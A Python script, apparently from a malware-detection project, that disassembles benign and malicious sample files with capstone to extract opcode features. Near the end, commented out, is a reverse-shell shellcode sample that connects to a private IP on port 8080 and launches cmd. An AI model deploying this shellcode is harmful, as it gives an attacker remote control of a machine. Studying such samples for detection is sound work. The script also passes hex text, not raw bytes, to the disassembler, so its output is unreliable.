import binascii
import os

from capstone import *

import utils

if __name__ == '__main__':
    # data_path = "generate_data/parser.csv"

    # 1、生成样本文件
    # utils.save_csv(data_path, utils.generate_data())

    # 2、测试提取特征逐个的成功率
    # data = utils.load_csv(data_path)
    # for i in range(len(data[0])):
    #     reward = utils.get_features_reward(data_path, [i])
    #     with open("get_features_reward.txt", 'a') as f:
    #         f.write("The reward of the feature {} is {}".format(i, reward))
    #         if reward > 0.7:
    #             f.write(" > 0.7")
    #         f.write("\n")

    # utils.judge_data_directory()
    paths = [utils.BENI_PATH, utils.MAL_PATH]
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    file_list = os.listdir(paths[0])
    for file_name in file_list:
        with open(paths[0] + '/' + file_name, 'rb') as file:
            byte = file.read()
            hex = binascii.b2a_hex(byte)
            # cur = 0
            # op_string = b''
            op_list = []
            # while (cur <= len(hex) - 2):
            #     # 用大小为N的滑动窗口扫描，截取大小为N的特征
            #     temp = hex[cur:cur + 2]
            #     op_string += temp
            #     cur += 2
            print('-----------File name:{}----------'.format(file))
            print(hex)
            for op in md.disasm(hex, 0x00):
                op_list.append(op.mnemonic)
            print(op_list)
            print('---------------------------------')

    # file_list = os.listdir(paths[1])
    # for file_name in file_list:
    #     with open(paths[1] + '/' + file_name, 'rb') as file:
    #         byte = file.read()
    #         hex_string = binascii.b2a_hex(byte).decode('ascii')
    #         print('-----------File name:{}----------'.format(file))
    #         print(hex_string)
    #         for op in md.disasm(hex_string, 0x00):
    #             print(op.mnemonic, op.op_str)
    #         print('---------------------------------')

    # shellcode = b""
    # shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    # shellcode += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    # shellcode += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    # shellcode += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    # shellcode += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    # shellcode += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    # shellcode += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    # shellcode += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    # shellcode += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    # shellcode += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    # shellcode += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    # shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    # shellcode += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    # shellcode += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    # shellcode += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x74\x80\x68"
    # shellcode += b"\x02\x00\x1f\x90\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    # shellcode += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    # shellcode += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    # shellcode += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    # shellcode += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    # shellcode += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    # shellcode += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    # shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68"
    # shellcode += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    # shellcode += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
    # md = Cs(CS_ARCH_X86, CS_MODE_32)
    # print(shellcode)
    # for op in md.disasm(shellcode, 0x0000):
    #     print(op.mnemonic, op.op_str)
